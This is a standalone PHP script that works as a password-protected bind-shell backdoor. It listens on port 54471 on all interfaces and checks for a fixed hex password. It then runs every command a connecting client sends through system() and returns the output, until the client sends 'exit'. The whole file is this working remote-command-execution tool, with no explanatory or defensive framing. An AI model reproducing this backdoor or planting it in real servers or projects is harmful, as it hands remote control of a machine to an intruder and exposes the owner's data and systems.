<?php

        $address="0.0.0.0";
        $port=54471;

        if(($sock = socket_create(AF_INET, SOCK_STREAM, 0)) < 0){
                echo "failed to create socket: ".socket_strerror($sock)."\n";
                exit();
        }

        if(($ret = socket_bind($sock, $address, $port)) < 0){
                echo "failed to bind socket: ".socket_strerror($ret)."\n";
                exit();
        }

        if( ( $ret = socket_listen( $sock, 0 ) ) < 0 ){
                echo "failed to listen to socket: ".socket_strerror($ret)."\n";
                exit();
        }

        echo "waiting for clients to connect\n";

        while (true)
        {
                $connection = socket_accept($sock);

                if ($connection === false){
                        usleep(100);
                }elseif ($connection > 0){

                        socket_write($connection,"Tell me the password to my castle!!!\n");

                        $var=socket_read($connection,1024);


                        if($var == "cefa8d4936750949ac38eb1997ba6b84\n"){

                                socket_write($connection,"Welcome my friend!!\n");

                                $var=socket_read($connection,1024);

                                while($var != "exit\n"){

                                        echo $var;
        
                                        $res=system($var);
        
                                        if(!socket_write($connection,$res."\n")){

                                                break;

                                        }
                                        $var=socket_read($connection,1024);

                                }
                        }

                        socket_close($connection);
                }else{
                        echo "error: ".socket_strerror($connection);
                        die;
                }
        } 

?>